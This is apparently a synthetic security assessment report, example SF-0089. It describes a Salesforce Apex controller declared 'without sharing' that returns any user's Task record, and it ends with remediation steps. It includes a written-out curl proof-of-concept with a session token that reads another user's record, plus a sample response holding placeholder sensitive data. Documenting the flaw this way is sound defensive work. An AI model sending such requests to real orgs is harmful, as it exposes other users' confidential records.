# Security Analysis Report
**System:** AquaGrid Meter Management (Salesforce-Integrated)
**Domain:** Water Utilities / Smart Meters
**Example ID:** SF-0089
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Insecure Design — Pattern 3.1 | Client-assumed authority on `TaskController.getTask` — attacker reads any water utility Task record without server-side ownership enforcement |

---

## Finding 1 — Insecure Design: Client-Assumed Authority on Task Object (Pattern 3.1)

### Summary
The Apex controller `TaskController` on AquaGrid Meter Management (`f52fbd05.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Task object. Per §5.0 Pattern 3.1, the design assumes the client will only supply `taskId` values it legitimately owns; no server-side ownership check is enforced.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getTaskDetails(String taskId, ...)` while the Aura descriptor in §6.0 is `c.TaskController.getTask`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 3.1 — Client-assumed authority (Insecure Design)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://f52fbd05.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://f52fbd05.lightning.force.com/aura
Authorization: Bearer 00DF52FBD05!ARf52fbd05...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00DF52FBD05!ARf52fbd05...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN",
"params":{"taskId":"001BD05","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Task Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001BD05", "Name": "Victim Task Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-13-4078"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00DF52FBD05!ARf52fbd05..."
curl -s -X POST "https://f52fbd05.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001BD05","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-13-4078
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class TaskController { ... }`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
